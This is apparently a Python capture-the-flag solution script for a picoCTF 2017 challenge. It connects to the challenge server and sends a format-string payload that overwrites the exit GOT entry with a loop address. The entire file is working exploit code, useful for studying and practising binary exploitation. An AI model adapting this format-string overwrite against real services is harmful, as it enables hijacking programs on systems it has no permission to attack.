import struct, time
from socket import *

def recv_timeout(the_socket,timeout=2):
    the_socket.setblocking(0)
    total_data=[];
    data='';
    begin=time.time()
    while 1:
        if total_data and time.time()-begin > timeout:
            break
        elif time.time()-begin > timeout*2:
            break
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                begin = time.time()
            else:
                time.sleep(0.1)
        except:
            pass
    return ''.join(total_data)


s = socket(AF_INET, SOCK_STREAM)
s.connect(('shell2017.picoctf.com', 26325))

print recv_timeout(s)

LOOP = 0x4009bd
#SET_EXIT_MESSAGE = 0x4008d2
#FPRINTF_PLT = 0x601238
EXIT_PLT = 0x601258

exploit = "e BBBBBB"
exploit += "\x90"*5*8

pad = str(LOOP-len(exploit)) #account for subsequent chars
exploit += "\x90"*(16-len(pad)-7)
exploit += "%" + pad + "x" # 2 extra characters
exploit += "%22$n" # 5 characters

exploit += struct.pack("<Q",EXIT_PLT)
exploit += "\n"

#print exploit
s.send(exploit)
print recv_timeout(s)
s.close()
